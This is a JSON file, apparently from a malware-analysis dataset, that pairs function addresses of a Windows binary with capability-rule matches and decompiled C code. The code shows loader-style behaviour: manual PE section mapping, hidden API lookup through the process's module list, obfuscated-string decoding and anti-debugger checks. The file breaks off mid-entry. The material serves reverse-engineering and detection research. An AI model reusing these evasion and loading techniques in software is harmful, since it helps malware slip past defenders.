{
    "00401000": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401000(int32_t arg_8h, ushort *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    // [00] -r-x section size 12288 named .text\n    *(arg_ch + 2) = arg_8h;\n    var_10h = 0;\n    iVar1 = var_10h;\n    do {\n        var_10h = iVar1;\n        iVar1 = var_10h + 1;\n    } while (*(arg_8h + var_10h) != '\\0');\n    arg_ch[1] = var_10h;\n    *arg_ch = var_10h;\n    return;\n}\n",
        "token_count": 177
    },
    "0040104e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040104e(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    if (arg_14h == 0) {\n        iVar1 = *(arg_18h + 0x3c);\n        var_38h = 0;\n        if (iVar1 != 0) {\n            do {\n                *(arg_8h + var_38h) = *(arg_ch + var_38h);\n                var_38h = var_38h + 1;\n            } while (var_38h != iVar1);\n        }\n    }\n    iVar1 = *(arg_10h + 0x10);\n    iVar2 = *(arg_10h + 0xc);\n    iVar3 = *(arg_10h + 0x14);\n    var_30h = 0;\n    if (iVar1 != 0) {\n        do {\n            *(arg_8h + iVar2 + var_30h) = *(arg_ch + iVar3 + var_30h);\n            var_30h = var_30h + 1;\n        } while (var_30h != iVar1);\n    }\n    return;\n}\n",
        "token_count": 381
    },
    "0040115d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040115d(uint arg_8h, uint arg_ch)\n\n{\n    uint var_20h;\n    uint var_1ch;\n    code *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    var_18h = *0x4178c4;\n    if (*0x4178c4 < 0x100) {\n        fcn.00401111();\n        var_18h = *0x4178c4;\n    }\n    var_20h = 0;\n    *0x4178c4 = var_18h;\n    if (0xff < var_18h) {\n        var_20h = (*var_18h)(0, arg_ch, 0x1000, arg_8h);\n    }\n    return var_20h;\n}\n",
        "token_count": 191
    },
    "004015e2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004015e2(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint var_10h;\n    uint var_8h;\n    \n    if (arg_ch != 0) {\n        *0x4178bc = arg_8h;\n        return arg_8h != 0;\n    }\n    *0x4178ac = arg_8h;\n    return arg_8h != 0;\n}\n",
        "token_count": 100
    },
    "004016f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004016f0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x4178ac = 0;\n    *0x4178bc = 0;\n    if (arg_8h != 0) {\n        if (arg_8h == 1) {\n            *0x4178ac = 1;\n        }\n        else {\n            *0x4178ac = arg_8h;\n        }\n    }\n    if (arg_ch != 0) {\n        *0x4178bc = arg_ch + 4;\n    }\n    return 1;\n}\n",
        "token_count": 164
    },
    "00401791": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040185c)\n\nvoid __cdecl fcn.00401791(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char *pcVar1;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    char *var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    if (((arg_8h != 0 && arg_ch != 0) && (pcVar1 = arg_ch + *(arg_ch + 0x3c),  *pcVar1 == 'P')) &&\n       (pcVar1 != NULL && pcVar1[1] == 'E')) {\n        if (*(pcVar1 + 6) != 0) {\n            var_18h = pcVar1 + *(pcVar1 + 0x14) + 0x18;\n            var_2ch = 0;\n            do {\n                fcn.0040104e(arg_8h, arg_ch, var_18h, var_2ch, pcVar1 + 0x18);\n                var_2ch = var_2ch + 1;\n                var_18h = var_18h + 0x28;\n            } while (var_2ch < *(pcVar1 + 6));\n        }\n    }\n    return;\n}\n",
        "token_count": 358
    },
    "00402230": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00402230(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    if (iVar1 == 0) {\n        iVar1 = -1;\n    }\n    return *(iVar1 + 0x34);\n}\n",
        "token_count": 72
    },
    "0040224a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.0040224a(void)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_c8h;\n    uint var_c4h;\n    int32_t var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    code *var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_64h;\n    uint var_60h;\n    int16_t *var_4ch;\n    uint32_t var_48h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    int32_t var_10h;\n    \n    var_10h = 0xbd3ed19;\n    fcn.004030d2(&var_20h);\n    var_64h = var_20h;\n    var_60h = *0x4178cc;\n    var_2ch = *0x4178ac;\n    var_28h = *0x4178b0;\n    var_24h = *0x4178b4;\n    var_30h = *0x4178b8;\n    var_34h = *0x4178bc;\n    for (var_a8h = fcn.00402594;\n        ((var_4ch = var_a8h,  *var_a8h != 0x5a4d ||\n         (iVar4 = var_a8h + *(var_a8h + 0x3c),  *(var_a8h + *(var_a8h + 0x3c)) != 'P')) || (*(iVar4 + 1) != 'E'));\n        var_a8h = var_a8h + -0x1000 & 0xfffff000) {\n    }\n    iVar3 = 0;\n    if (*(iVar4 + 1) == 'E') {\n        iVar3 = iVar4;\n    }\n    uVar1 = *(iVar3 + 0x50);\n    var_48h = uVar1;\n    pcVar2 = fcn.00402af0(&var_98h, var_18h);\n    var_c0h = 0;\n    if (pcVar2 != NULL) {\n        iVar4 = 200;\n        if (uVar1 == 0) {\n            iVar4 = 199;\n        }\n        iVar3 = 0xbd3ed1a - var_10h;\n        (*pcVar2)(&var_98h);\n        if (3 < uVar1) {\n            iVar3 = 2;\n        }\n        var_c0h = iVar3 + iVar4 + 1;\n    }\n    return var_c0h;\n}\n",
        "token_count": 667
    },
    "00402411": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402411(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_20h = 0;\n    if (arg_10h != 0) {\n        do {\n            uVar1 = var_20h & 7;\n            if (var_20h < 8) {\n                uVar1 = var_20h;\n            }\n            if (arg_10h < uVar1 || 8 < uVar1) {\n                return;\n            }\n            *(arg_8h + var_20h) = *(arg_ch + var_20h) - *(uVar1 + 0x4041ed);\n            var_20h = var_20h + 1;\n        } while (var_20h < arg_10h);\n    }\n    return;\n}\n",
        "token_count": 248
    },
    "004024a1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004024a1(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_20h = 4;\n    var_24h = 0;\n    do {\n        for (uVar1 = *(var_24h + 0x4041ba); uVar1 < arg_10h; uVar1 = uVar1 + 0x33) {\n            uVar2 = uVar1 & 3;\n            if (2 < var_20h) {\n                uVar2 = uVar1 % 0x32;\n            }\n            var_20h = var_20h + uVar1;\n            *(arg_8h + uVar1) = *(arg_ch + uVar1) - *(uVar2 + 0x404187);\n        }\n        var_24h = var_24h + 1;\n    } while (var_20h != 0 && var_24h < 0x33);\n    return;\n}\n",
        "token_count": 324
    },
    "004025eb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004025eb(uint noname_0, uint arg_ch)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint in_stack_ffffffe8;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00402b8a();\n    bVar2 = true;\n    if (iVar1 == 0) {\n        iVar1 = fcn.0040321f(in_stack_ffffffe8, arg_ch);\n        bVar2 = true;\n        if (iVar1 == 0) {\n            iVar1 = fcn.00402eab();\n            bVar2 = iVar1 != 0;\n        }\n    }\n    return bVar2;\n}\n",
        "token_count": 165
    },
    "0040268c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0040268c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    if (iVar1 == 0) {\n        iVar1 = -1;\n    }\n    return *(iVar1 + 0x30);\n}\n",
        "token_count": 73
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nint32_t __cdecl entry0(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    uint var_8h;\n    uint var_ch;\n    uint in_stack_ffffff88;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    \n    var_28h = 0x4329cf8b;\n    (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n    fcn.00401666();\n    (*_sym.imp.USER32.dll_IsClipboardFormatAvailable)(0x9d7);\n    (*_sym.imp.USER32.dll_GetShellWindow)();\n    iVar1 = fcn.004025eb(in_stack_ffffff88, _sym.imp.KERNEL32.dll_CloseHandle);\n    if (iVar1 == 0x4329cf8b - var_28h) {\n        *0x4178ac = 0;\n        *0x4178bc = NULL;\n        if ((unaff_ESI != 0) && (*0x4178ac = unaff_ESI,  unaff_ESI == 1)) {\n            *0x4178ac = 1;\n        }\n        if (*0x10 != 0x4) {\n            *0x4178bc = *0x10;\n        }\n        *0x4178b0 = unaff_EDI;\n        *0x4178b4 = unaff_EBX;\n        *0x4178b8 = unaff_EBP;\n        fcn.0040224a();\n        (*_sym.imp.GDI32.dll_SetViewportExtEx)(0x4be827, 0xa6a, 0xa6a, &var_30h);\n    }\n    fcn.0040136e();\n    iVar1 = 0x4329cf8b - var_28h;\n    fcn.004013d1();\n    return iVar1;\n}\n",
        "token_count": 634
    },
    "0040279e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040279e(int32_t arg_8h)\n\n{\n    char cVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    uint var_30h;\n    uint16_t *var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    iVar4 = fcn.004029e6();\n    iVar5 = 0;\n    if (*(iVar4 + 1 + *(iVar4 + 0x3c)) == 'E') {\n        iVar5 = iVar4 + *(iVar4 + 0x3c);\n    }\n    iVar5 = *(iVar5 + 0x78);\n    uVar3 = *(iVar4 + 0x18 + iVar5);\n    if (uVar3 != 0) {\n        var_2ch = iVar4 + *(iVar4 + iVar5 + 0x24);\n        var_28h = 0;\n        do {\n            var_38h = 0;\n            do {\n                cVar1 = *(iVar4 + *(iVar4 + *(iVar4 + 0x20 + iVar5) + var_28h * 4) + var_38h);\n                cVar2 = *(arg_8h + var_38h);\n                if (cVar1 == '\\0') break;\n                var_38h = var_38h + 1;\n            } while ((cVar1 == cVar2 && cVar2 != '\\0') && var_38h < 0x20);\n            if (cVar1 == cVar2) {\n                return iVar4 + *(iVar4 + *(iVar4 + iVar5 + 0x1c) + *var_2ch * 4);\n            }\n            var_28h = var_28h + 1;\n            var_2ch = var_2ch + 1;\n        } while (var_28h < uVar3);\n    }\n    return 0;\n}\n",
        "token_count": 510
    },
    "004028b7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_eh\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004028b7(void)\n\n{\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_89h;\n    uint *var_84h;\n    uint *var_80h;\n    int32_t var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_1fh;\n    uint var_eh;\n    \n    var_80h = &var_1fh;\n    var_eh._0_2_ = 0xa841;\n    fcn.00402411(var_80h, 0x404153, 0xe);\n    var_7ch = 0;\n    var_84h = &var_68h;\n    do {\n        if (*var_80h == '\\0') {\n            *var_84h = var_eh ^ 0xa841;\n            break;\n        }\n        *var_84h = *var_80h;\n        var_7ch = var_7ch + 1;\n        var_84h = var_84h + 2;\n        var_80h = var_80h + 1;\n    } while (var_7ch != 0x11);\n    fcn.00402c4b(&var_68h, 0);\n    return;\n}\n",
        "token_count": 336
    },
    "004029e6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004029e6(void)\n\n{\n    int32_t iVar1;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint *var_88h;\n    uint *var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ah;\n    uint var_24h;\n    int32_t var_10h;\n    \n    var_84h = &var_24h;\n    var_10h = 0x30e9de88;\n    fcn.00402411(var_84h, 0x404148, 0xb);\n    var_80h = 0;\n    var_88h = &var_6ah;\n    do {\n        if (*var_84h == '\\0') {\n            *var_88h = 0;\n            break;\n        }\n        iVar1 = var_10h + -0x30e9de87;\n        *var_88h = *var_84h;\n        var_88h = var_88h + 2;\n        var_80h = var_80h + iVar1;\n        var_84h = var_84h + 1;\n    } while (var_80h != 0x14);\n    fcn.00402c4b(&var_6ah, 0);\n    return;\n}\n",
        "token_count": 333
    },
    "00402af0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402af0(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    arg_8h_00 = fcn.0040115d(0x40, *0x4178c8);\n    var_1ch = 0;\n    if (arg_8h_00 != 0) {\n        fcn.00401791(arg_8h_00, arg_ch);\n        *(arg_8h + 0x54) = arg_8h_00;\n        *(arg_8h + 0x58) = arg_8h_00 + -0x400000;\n        var_1ch = arg_8h_00 + 0x2b30;\n    }\n    return var_1ch;\n}\n",
        "token_count": 224
    },
    "00402c4b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_eh\n// WARNING: Removing unreachable block (ram,0x00402d29)\n\nint32_t * __cdecl fcn.00402c4b(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int16_t iVar3;\n    int16_t iVar4;\n    int32_t in_FS_OFFSET;\n    bool bVar5;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    int32_t *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_3dh;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_26h;\n    uint var_1dh;\n    uint var_18h;\n    uint var_14h;\n    uint var_eh;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    if (iVar1 == 0) {\n        iVar1 = -1;\n    }\n    iVar1 = *(*(iVar1 + 0x30) + 0xc);\n    piVar2 = iVar1 + 0x14;\n    var_4ch = *(iVar1 + 0x14);\n    if (var_4ch != piVar2) {\n        do {\n            if (arg_ch != NULL && var_4ch[4] == arg_ch) {\n                return var_4ch + -2;\n            }\n            if (arg_8h != 0) {\n                stack0xffffffc0 = 0;\n                if (*(var_4ch + 9) >> 1 != 0) {\n                    do {\n                        iVar3 = *(var_4ch[10] + stack0xffffffc0 * 2);\n                        if (iVar3 - 0x61U < 0x1a) {\n                            iVar3 = iVar3 + -0x20;\n                        }\n                        iVar4 = *(arg_8h + stack0xffffffc0 * 2);\n                        if (iVar4 - 0x61U < 0x1a) {\n                            iVar4 = iVar4 + -0x20;\n                        }\n                        if (iVar3 == 0) {\n                            bVar5 = iVar4 == 0;\n                            break;\n                        }\n                        bVar5 = iVar3 == iVar4;\n                        *0x8 = stack0xffffffc0 + 1;\n                    } while (bVar5 && *0x8 < *(var_4ch + 9) >> 1);\n                    if (bVar5) {\n                        return var_4ch[4];\n                    }\n                }\n            }\n            var_4ch = *var_4ch;\n        } while (var_4ch != piVar2);\n    }\n    return NULL;\n}\n",
        "token_count": 642
    },
    "00402e79": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402e79(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    iVar1 = var_8h;\n    do {\n        var_8h = iVar1;\n        iVar1 = var_8h + 1;\n    } while (*(arg_8h + var_8h) != '\\0');\n    return var_8h;\n}\n",
        "token_count": 119
    },
    "00402eab": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool fcn.00402eab(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t in_FS_OFFSET;\n    bool bVar3;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x53108ece;\n    var_8h = 0;\n    iVar1 = fcn.004029e6();\n    bVar3 = false;\n    if (iVar1 != 0) {\n        iVar1 = fcn.00402c4b(0, iVar1);\n        pcVar2 = fcn.00402645();\n        bVar3 = false;\n        if (pcVar2 != NULL) {\n            bVar3 = false;\n            if (**(iVar1 + 0x28) != 0) {\n                (*pcVar2)(*(iVar1 + 0x28), &var_8h);\n                iVar1 = *(in_FS_OFFSET + 0x18);\n                if (iVar1 == 0) {\n                    iVar1 = -1;\n                }\n                bVar3 = *(iVar1 + 0x34) != 0xc1;\n            }\n        }\n    }\n    return bVar3;\n}\n",
        "token_count": 318
    },
    "00402f61": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00402f61(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_78h;\n    int32_t var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_18h;\n    uchar var_11h;\n    uint var_10h;\n    \n    var_10h = 0x3d241584;\n    var_11h = 0x9a;\n    var_18h = 0;\n    var_5ch = 0;\n    if (arg_ch != 0) {\n        fcn.00402411(&var_3ch, 0x404161, 0x18);\n        var_40h = 0;\n        var_44h._2_2_ = 0;\n        var_44h._0_2_ = 0;\n        pcVar2 = fcn.0040279e(&var_3ch);\n        var_5ch = 0;\n        if (pcVar2 != NULL) {\n            var_40h = arg_ch;\n            var_74h = 0;\n            iVar1 = var_74h;\n            do {\n                var_74h = iVar1;\n                iVar1 = var_74h + 1;\n            } while (*(arg_ch + var_74h) != '\\0');\n            var_44h._0_2_ = var_74h;\n            var_44h._2_2_ = var_44h;\n            (*pcVar2)(arg_8h, &var_44h, 0, &var_18h);\n            var_5ch = var_18h;\n        }\n    }\n    return var_5ch;\n}\n",
        "token_count": 486
    },
    "004032ae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nint16_t * __cdecl fcn.004032ae(int32_t arg_8h)\n\n{\n    uint var_1ch;\n    int16_t *var_18h;\n    uint var_14h;\n    uint var_10h;\n    code *var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    var_ch = fcn.00402594;\n    if (arg_8h == 0) {\n        for (; ((*var_ch != 0x5a4d || (*(var_ch + *(var_ch + 0x3c)) != 'P')) ||\n               (var_18h = var_ch,  *(var_ch + *(var_ch + 0x3c) + 1) != 'E')); var_ch = var_ch + -0x1000 & 0xfffff000) {\n        }\n    }\n    else {\n        var_18h = fcn.00402c4b(arg_8h, 0);\n    }\n    return var_18h;\n}\n",
        "token_count": 238
    },
    "004011f4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint32_t __cdecl fcn.004011f4(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_bp_ch;\n    \n    uVar1 = arg_8h & 3;\n    if (2 < arg_ch) {\n        uVar1 = arg_8h % 0x32;\n    }\n    return uVar1;\n}\n",
        "token_count": 104
    },
    "00402b8a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nbool fcn.00402b8a(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int32_t iVar4;\n    int32_t in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    iVar2 = fcn.004029e6();\n    iVar4 = 0;\n    if (*(iVar2 + 1 + *(iVar2 + 0x3c)) == 'E') {\n        iVar4 = iVar2 + *(iVar2 + 0x3c);\n    }\n    iVar2 = *(in_FS_OFFSET + 0x18);\n    if (iVar2 == 0) {\n        iVar2 = -1;\n    }\n    uVar1 = *(*(iVar2 + 0x30) + 0xa4);\n    bVar3 = true;\n    if (uVar1 != 5) {\n        bVar3 = 0x549352b9 < *(iVar4 + 8) && uVar1 < 6;\n    }\n    return bVar3;\n}\n",
        "token_count": 247
    },
    "0040321f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
